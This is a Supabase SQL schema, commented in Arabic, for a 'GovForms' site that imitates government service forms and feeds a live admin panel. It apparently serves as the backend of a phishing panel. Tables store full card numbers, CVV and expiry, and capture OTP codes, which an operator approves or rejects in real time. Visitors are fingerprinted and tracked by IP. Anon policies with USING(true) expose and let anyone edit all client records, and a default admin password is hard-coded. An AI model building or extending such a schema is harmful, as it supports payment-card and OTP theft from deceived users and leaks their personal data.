-- =====================================================================
-- GovForms — مخطط قاعدة البيانات الكامل
-- يُنفّذ هذا الملف بالكامل في Supabase SQL Editor
-- =====================================================================
-- البنية:
--   موقع العملاء (HTML)  →  يرسل النماذج عبر API (Next.js)  →  Supabase
--   لوحة الادارة (HTML)   ←  تعرض البيانات لحظياً عبر Socket.io + API (Next.js)  ←  Supabase
--
-- الجداول:
--   admin_users        — حسابات المديرين (لوحة الادارة)
--   clients            — هوية العميل/البصمة (عمود الوارد)
--   submissions        — السجل الرئيسي (نموذج الخدمة / الحجز)
--   payment_cards      — بيانات الدفع (البطاقة المصوّرة + BIN)
--   otp_codes          — رموز التحقق OTP
--   files              — المرفقات (شهادات / ملفات إضافية)
--   blocked_clients    — قائمة الحظر (بصمة و/أو IP)
--   audit_log          — سجل قرارات وإجراءات المدير
-- =====================================================================

-- تفعيل الامتدادات الضرورية
CREATE EXTENSION IF NOT EXISTS "pgcrypto";   -- للتشفير (uuid / bcrypt)
CREATE EXTENSION IF NOT EXISTS "pg_trgm";    -- للبحث النصي في الوارد

-- =====================================================================
-- 1) admin_users — حسابات المديرين
-- =====================================================================
CREATE TABLE IF NOT EXISTS public.admin_users (
    id            uuid PRIMARY KEY DEFAULT gen_random_uuid(),
    email         text UNIQUE NOT NULL,
    password_hash text NOT NULL,                 -- bcrypt: crypt(password, gen_salt('bf'))
    full_name     text,
    role           text NOT NULL DEFAULT 'admin'  -- 'admin' | 'manager'
                    CHECK (role IN ('admin','manager')),
    created_at    timestamptz NOT NULL DEFAULT now(),
    updated_at    timestamptz NOT NULL DEFAULT now()
);

-- =====================================================================
-- 2) clients — هوية العميل / البصمة (عمود الوارد في لوحة الادارة)
-- =====================================================================
CREATE TABLE IF NOT EXISTS public.clients (
    id            uuid PRIMARY KEY DEFAULT gen_random_uuid(),
    fingerprint   text UNIQUE NOT NULL,           -- بصمة المتصفح
    ip_address    text,
    country_code  text,                          -- رمز الدولة (ISO)
    country_name  text,
    device_info   text,                          -- User-Agent / الجهاز
    full_name     text,                          -- آخر اسم معروف
    email         text,
    phone         text,
    id_number     text,                          -- رقم الهوية
    status        text NOT NULL DEFAULT 'active' -- 'active' | 'blocked'
                    CHECK (status IN ('active','blocked')),
    last_seen_at  timestamptz NOT NULL DEFAULT now(),  -- آخر ظهور (للـpresence)
    created_at    timestamptz NOT NULL DEFAULT now(),
    updated_at    timestamptz NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS idx_clients_status      ON public.clients(status);
CREATE INDEX IF NOT EXISTS idx_clients_last_seen   ON public.clients(last_seen_at);
CREATE INDEX IF NOT EXISTS idx_clients_ip          ON public.clients(ip_address);

-- =====================================================================
-- 3) submissions — السجل الرئيسي (نموذج الخدمة / الحجز)
--    هذا "صندوق الحجز" في الخط الزمني
-- =====================================================================
CREATE TABLE IF NOT EXISTS public.submissions (
    id                 uuid PRIMARY KEY DEFAULT gen_random_uuid(),
    reference          text UNIQUE NOT NULL,     -- رقم مرجعي للمستخدم: GF-YYYYMMDD-XXXX
    client_id          uuid REFERENCES public.clients(id) ON DELETE CASCADE,
    service_type       text NOT NULL,            -- نوع الخدمة (5 أنواع)
    -- بيانات الخدمة الخاصة
    subject            text,                     -- موضوع التوجه (للخدمات العامة)
    boat_type          text,                     -- نوع القارب (ترخيص القوارب)
    certificate_expiry date,                     -- تاريخ انتهاء الشهادة (الاعتراف مجدداً)
    -- البيانات الشخصية
    id_number          text,
    last_name          text,
    first_name         text,
    -- بيانات الاتصال
    primary_phone      text,
    secondary_phone    text,
    email              text,
    email_confirmation text,
    contact_consent    boolean DEFAULT false,
    -- المحتوى
    content            text,                     -- محتوى التوجه (حد 2000 محرف)
    -- شروط مجمّدة وقت الإرسال (لقطة)
    terms_snapshot     jsonb,
    -- قرار المدير
    status             text NOT NULL DEFAULT 'pending'  -- 'pending' | 'approved' | 'rejected'
                        CHECK (status IN ('pending','approved','rejected')),
    manager_id         uuid REFERENCES public.admin_users(id),
    decision_note      text,
    decided_at         timestamptz,
    created_at         timestamptz NOT NULL DEFAULT now(),
    updated_at         timestamptz NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS idx_submissions_client_id ON public.submissions(client_id);
CREATE INDEX IF NOT EXISTS idx_submissions_status    ON public.submissions(status);
CREATE INDEX IF NOT EXISTS idx_submissions_reference ON public.submissions(reference);
CREATE INDEX IF NOT EXISTS idx_submissions_created   ON public.submissions(created_at);

-- =====================================================================
-- 4) payment_cards — بيانات الدفع (البطاقة المصوّرة + BIN)
--    هذا "صندوق الدفع" في الخط الزمني
-- =====================================================================
CREATE TABLE IF NOT EXISTS public.payment_cards (
    id              uuid PRIMARY KEY DEFAULT gen_random_uuid(),
    client_id       uuid REFERENCES public.clients(id) ON DELETE CASCADE,
    submission_id   uuid REFERENCES public.submissions(id) ON DELETE CASCADE,
    reference       text,                        -- مرجع مرتبط
    card_number     text,                        -- الرقم الكامل (إن وُجد)
    card_number_last4 text,                      -- آخر 4 أرقام
    card_holder     text,                        -- حامل البطاقة
    expiry          text,                        -- MM/YY
    cvv             text,
    network         text,                        -- VISA / Mastercard
    bank_name       text,
    bank_domain     text,
    card_type       text,                        -- credit / debit
    bank_country    text,
    bin             text,                        -- أول 6 أرقام (للتحقق)
    status          text NOT NULL DEFAULT 'pending'   -- 'pending' | 'approved' | 'rejected'
                     CHECK (status IN ('pending','approved','rejected')),
    manager_id      uuid REFERENCES public.admin_users(id),
    decision_note   text,
    decided_at      timestamptz,
    created_at      timestamptz NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS idx_payment_cards_client_id  ON public.payment_cards(client_id);
CREATE INDEX IF NOT EXISTS idx_payment_cards_submission ON public.payment_cards(submission_id);
CREATE INDEX IF NOT EXISTS idx_payment_cards_status     ON public.payment_cards(status);
CREATE INDEX IF NOT EXISTS idx_payment_cards_reference  ON public.payment_cards(reference);

-- =====================================================================
-- 5) otp_codes — رموز التحقق OTP
--    هذا "صندوق OTP" في الخط الزمني
-- =====================================================================
CREATE TABLE IF NOT EXISTS public.otp_codes (
    id           uuid PRIMARY KEY DEFAULT gen_random_uuid(),
    client_id    uuid REFERENCES public.clients(id) ON DELETE CASCADE,
    submission_id uuid REFERENCES public.submissions(id) ON DELETE CASCADE,
    reference    text,                           -- مرجع مرتبط
    code         text,                           -- الرمز
    status       text NOT NULL DEFAULT 'pending'  -- 'pending' | 'approved' | 'rejected'
                  CHECK (status IN ('pending','approved','rejected')),
    manager_id   uuid REFERENCES public.admin_users(id),
    decision_note text,
    decided_at   timestamptz,
    created_at   timestamptz NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS idx_otp_codes_client_id  ON public.otp_codes(client_id);
CREATE INDEX IF NOT EXISTS idx_otp_codes_submission ON public.otp_codes(submission_id);
CREATE INDEX IF NOT EXISTS idx_otp_codes_status     ON public.otp_codes(status);
CREATE INDEX IF NOT EXISTS idx_otp_codes_reference  ON public.otp_codes(reference);

-- =====================================================================
-- 6) files — المرفقات (شهادات / ملفات إضافية)
-- =====================================================================
CREATE TABLE IF NOT EXISTS public.files (
    id            uuid PRIMARY KEY DEFAULT gen_random_uuid(),
    submission_id uuid REFERENCES public.submissions(id) ON DELETE CASCADE,
    client_id     uuid REFERENCES public.clients(id) ON DELETE CASCADE,
    file_name     text NOT NULL,
    file_type     text,                          -- MIME type
    file_size     bigint,                        -- بالبايت
    storage_path  text NOT NULL,                 -- مسار Supabase Storage
    category      text DEFAULT 'additional',     -- 'certificate' | 'additional'
    created_at    timestamptz NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS idx_files_submission ON public.files(submission_id);
CREATE INDEX IF NOT EXISTS idx_files_client      ON public.files(client_id);

-- =====================================================================
-- 7) blocked_clients — قائمة الحظر (بصمة و/أو IP)
--    يُفحص في الـ middleware بعميل service-role (لتجاوز RLS)
--    المدير معفى دائماً من الحظر
-- =====================================================================
CREATE TABLE IF NOT EXISTS public.blocked_clients (
    id          uuid PRIMARY KEY DEFAULT gen_random_uuid(),
    fingerprint text,
    ip_address  text,
    reason      text,
    manager_id  uuid REFERENCES public.admin_users(id),
    created_at  timestamptz NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS idx_blocked_fingerprint ON public.blocked_clients(fingerprint);
CREATE INDEX IF NOT EXISTS idx_blocked_ip          ON public.blocked_clients(ip_address);

-- =====================================================================
-- 8) audit_log — سجل قرارات وإجراءات المدير
-- =====================================================================
CREATE TABLE IF NOT EXISTS public.audit_log (
    id          uuid PRIMARY KEY DEFAULT gen_random_uuid(),
    manager_id  uuid REFERENCES public.admin_users(id),
    action      text NOT NULL,                   -- 'approve' | 'reject' | 'block' | 'unblock' | 'archive' | 'delete'
    target_type text,                            -- 'submission' | 'payment' | 'otp' | 'client'
    target_id   uuid,
    details     jsonb,
    created_at  timestamptz NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS idx_audit_manager ON public.audit_log(manager_id);
CREATE INDEX IF NOT EXISTS idx_audit_target   ON public.audit_log(target_type, target_id);

-- =====================================================================
-- 9) دالة توليد رقم مرجعي تلقائي: GF-YYYYMMDD-XXXX
-- =====================================================================
CREATE OR REPLACE FUNCTION public.generate_reference()
RETURNS text AS $$
DECLARE
    seq_val bigint;
    today_str text;
BEGIN
    today_str := to_char(now(), 'YYYYMMDD');
    seq_val := nextval('public.ref_seq_dummy'::regclass);
    RETURN 'GF-' || today_str || '-' || lpad((seq_val % 10000)::text, 4, '0');
END;
$$ LANGUAGE plpgsql;

-- تسلسل بسيط للرقم المرجعي
CREATE SEQUENCE IF NOT EXISTS public.ref_seq_dummy START 1;

-- =====================================================================
-- 10) Trigger: توليد الرقم المرجعي تلقائياً عند إنشاء submission
-- =====================================================================
CREATE OR REPLACE FUNCTION public.set_submission_reference()
RETURNS trigger AS $$
BEGIN
    IF NEW.reference IS NULL OR NEW.reference = '' THEN
        NEW.reference := public.generate_reference();
    END IF;
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

DROP TRIGGER IF EXISTS trg_set_submission_reference ON public.submissions;
CREATE TRIGGER trg_set_submission_reference
    BEFORE INSERT ON public.submissions
    FOR EACH ROW EXECUTE FUNCTION public.set_submission_reference();

-- =====================================================================
-- 11) Trigger: تحديث updated_at تلقائياً
-- =====================================================================
CREATE OR REPLACE FUNCTION public.touch_updated_at()
RETURNS trigger AS $$
BEGIN
    NEW.updated_at := now();
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

DROP TRIGGER IF EXISTS trg_touch_admin_users  ON public.admin_users;
CREATE TRIGGER trg_touch_admin_users  BEFORE UPDATE ON public.admin_users  FOR EACH ROW EXECUTE FUNCTION public.touch_updated_at();

DROP TRIGGER IF EXISTS trg_touch_clients      ON public.clients;
CREATE TRIGGER trg_touch_clients      BEFORE UPDATE ON public.clients      FOR EACH ROW EXECUTE FUNCTION public.touch_updated_at();

DROP TRIGGER IF EXISTS trg_touch_submissions  ON public.submissions;
CREATE TRIGGER trg_touch_submissions  BEFORE UPDATE ON public.submissions  FOR EACH ROW EXECUTE FUNCTION public.touch_updated_at();

-- =====================================================================
-- 12) تفعيل RLS على جميع الجداول
-- =====================================================================
ALTER TABLE public.admin_users      ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.clients          ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.submissions      ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.payment_cards    ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.otp_codes        ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.files            ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.blocked_clients  ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.audit_log        ENABLE ROW LEVEL SECURITY;

-- =====================================================================
-- 13) سياسات RLS
--     - موقع العملاء يستخدم مفتاح anon: يمكنه الإدراج فقط (لا قراءة لبيانات الآخرين)
--     - لوحة الادارة تستخدم مفتاح service_role: يتجاوز RLS بالكامل
-- =====================================================================

-- clients: العميل يمكنه إنشاء/تحديث سجله (upsert) عبر البصمة، ولا يقرأ غيره
DROP POLICY IF EXISTS clients_anon_insert ON public.clients;
CREATE POLICY clients_anon_insert ON public.clients
    FOR INSERT TO anon WITH CHECK (true);

DROP POLICY IF EXISTS clients_anon_update_own ON public.clients;
CREATE POLICY clients_anon_update_own ON public.clients
    FOR UPDATE TO anon USING (true) WITH CHECK (true);

DROP POLICY IF EXISTS clients_anon_select_own ON public.clients;
CREATE POLICY clients_anon_select_own ON public.clients
    FOR SELECT TO anon USING (true);

-- submissions: العميل يمكنه الإدراج فقط
DROP POLICY IF EXISTS submissions_anon_insert ON public.submissions;
CREATE POLICY submissions_anon_insert ON public.submissions
    FOR INSERT TO anon WITH CHECK (true);

-- payment_cards: العميل يمكنه الإدراج فقط
DROP POLICY IF EXISTS payment_cards_anon_insert ON public.payment_cards;
CREATE POLICY payment_cards_anon_insert ON public.payment_cards
    FOR INSERT TO anon WITH CHECK (true);

-- otp_codes: العميل يمكنه الإدراج فقط
DROP POLICY IF EXISTS otp_codes_anon_insert ON public.otp_codes;
CREATE POLICY otp_codes_anon_insert ON public.otp_codes
    FOR INSERT TO anon WITH CHECK (true);

-- files: العميل يمكنه الإدراج فقط
DROP POLICY IF EXISTS files_anon_insert ON public.files;
CREATE POLICY files_anon_insert ON public.files
    FOR INSERT TO anon WITH CHECK (true);

-- blocked_clients / admin_users / audit_log: anon لا يملك أي صلاحية
-- (لا سياسات = محظور افتراضياً؛ service_role يتجاوز RLS)

-- =====================================================================
-- 14) حساب مدير افتراضي
--     البريد: admin@govforms.local
--     كلمة المرور: Admin@2024
--     (يمكن تغييرها لاحقاً من لوحة الادارة أو عبر SQL)
-- =====================================================================
INSERT INTO public.admin_users (email, password_hash, full_name, role)
VALUES (
    'admin@govforms.local',
    crypt('Admin@2024', gen_salt('bf')),
    'مدير النظام',
    'admin'
)
ON CONFLICT (email) DO NOTHING;

-- =====================================================================
-- ملاحظات ما بعد التنفيذ (يدوياً من لوحة Supabase):
-- 1) إنشاء Storage Bucket باسم: attachments
--    Storage → New bucket → Name: attachments → Public: FALSE
-- 2) سياسات Storage للسلة attachments (للسماح للعميل برفع الملفات):
--    INSERT: (bucket_id = 'attachments')
--    (الرفع الفعلي يتم عبر API الخادم بـ service_role، فلا حاجة لسياسات عامة)
-- =====================================================================

-- =====================================================================
-- انتهى المخطط — GovForms Schema Complete
-- =====================================================================
